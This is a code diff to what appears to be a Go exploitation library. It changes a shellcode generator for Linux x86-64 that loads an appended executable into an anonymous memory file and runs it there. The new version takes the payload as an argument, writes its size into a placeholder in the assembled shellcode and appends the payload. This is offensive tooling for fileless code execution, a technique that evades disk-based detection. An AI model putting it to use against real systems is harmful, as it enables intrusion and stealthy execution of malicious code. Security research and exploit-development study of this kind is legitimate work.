@@ -1,6 +1,7 @@
 package shellcode
 
 import (
+	"bytes"
 	sp "github.com/zznop/sploit"
 )
 
@@ -22,7 +23,7 @@ func NewX8664() *X8664 {
 }
 
 // LinuxMemFdExec constructs a payload to run the supplied executable in an anonymous file descriptor
-func (x8664 *X8664) LinuxMemFdExec() ([]byte, error) {
+func (x8664 *X8664) LinuxMemFdExec(payload []byte) ([]byte, error) {
 	instrs := `
 jmp past
 
@@ -89,5 +90,13 @@ fixup_fd_path:
 /* appended script or ELF executable */
 executable:
 `
-	return sp.Asm(x8664.arch, instrs)
+	unconfigured, err := sp.Asm(x8664.arch, instrs)
+	if err != nil {
+		return nil, err
+	}
+
+	size := sp.PackUint64LE(uint64(len(payload)))
+	configured := bytes.Replace(unconfigured, []byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41}, size, 1)
+	configured = append(configured, payload...)
+	return configured, nil
 }
